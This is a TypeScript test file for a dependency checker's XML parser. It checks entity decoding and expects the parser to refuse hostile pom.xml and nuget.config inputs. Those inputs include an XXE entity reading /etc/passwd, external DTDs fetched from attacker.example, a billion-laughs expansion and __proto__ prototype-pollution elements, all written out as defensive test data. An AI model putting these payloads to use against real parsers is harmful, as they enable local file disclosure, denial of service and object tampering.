import { describe, it, strict } from 'poku';
import { readNugetConfig } from '../../../src/hooks/dependency/dotnet/config.js';
import { readPom } from '../../../src/hooks/dependency/jvm/maven.js';

const pomWithRepository = (url: string, prologue = ''): string =>
  `${prologue}<project><repositories><repository><url>${url}</url></repository></repositories></project>`;

const flaggedNames = (content: string): (string | null)[] =>
  readPom('pom.xml', content).flags.map(({ name }) => name);

const refuses = (read: () => unknown): boolean => {
  try {
    read();
  } catch {
    return true;
  }

  return false;
};

describe('XML a dependency file holds is read the way XML defines it', () => {
  it('decodes the predefined entities, numeric character references, and character data before judging a URL', () => {
    const results = [
      '&#104;ttp://decimal.example',
      '&#x68;ttp://hexadecimal.example',
      '<![CDATA[http://cdata.example]]>',
      'http://query.example/?a=1&amp;b=2',
    ].map((url) => flaggedNames(pomWithRepository(url)));

    strict.deepStrictEqual(results, [
      ['http://decimal.example'],
      ['http://hexadecimal.example'],
      ['http://cdata.example'],
      ['http://query.example/?a=1&b=2'],
    ]);
  });
});

describe('a hostile XML file stops the checker instead of steering it', () => {
  const cases: Array<[string, string]> = [
    [
      'an internal entity that would hide a URL',
      pomWithRepository(
        '&repo;',
        '<!DOCTYPE project [<!ENTITY repo "http://hidden.example">]>'
      ),
    ],
    [
      'an external entity that would read a local file',
      pomWithRepository(
        '&secret;',
        '<!DOCTYPE project [<!ENTITY secret SYSTEM "file:///etc/passwd">]>'
      ),
    ],
    [
      'a parameter entity that would fetch a remote DTD',
      pomWithRepository(
        'https://ok.example',
        '<!DOCTYPE project [<!ENTITY % remote SYSTEM "http://attacker.example/x.dtd"> %remote;]>'
      ),
    ],
    [
      'an external DTD',
      pomWithRepository(
        'https://ok.example',
        '<!DOCTYPE project SYSTEM "http://attacker.example/project.dtd">'
      ),
    ],
    [
      'nested entities that would expand without bound',
      pomWithRepository(
        '&lol3;',
        `<!DOCTYPE project [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>`
      ),
    ],
    [
      'an element named to reach the prototype of every object',
      '<project><__proto__><polluted>yes</polluted></__proto__></project>',
    ],
    [
      'elements nested deeper than any dependency file needs',
      `<project>${'<a>'.repeat(200)}${'</a>'.repeat(200)}</project>`,
    ],
    [
      'a repeated attribute',
      '<project><repositories><repository url="a" url="b" /></repositories></project>',
    ],
  ];

  for (const [description, content] of cases)
    it(`refuses ${description}`, () => {
      strict.throws(
        () => readPom('pom.xml', content),
        /pom\.xml .+, so the dependency checker cannot judge it/
      );
    });

  it('leaves the prototype every object shares untouched', () => {
    const before = Object.getOwnPropertyNames(Object.prototype);
    const refused = refuses(() =>
      readNugetConfig(
        'nuget.config',
        '<configuration><packageSources><__proto__ value="http://x" /></packageSources></configuration>'
      )
    );
    const after = Object.getOwnPropertyNames(Object.prototype);

    strict.deepStrictEqual([refused, after], [true, before]);
  });
});
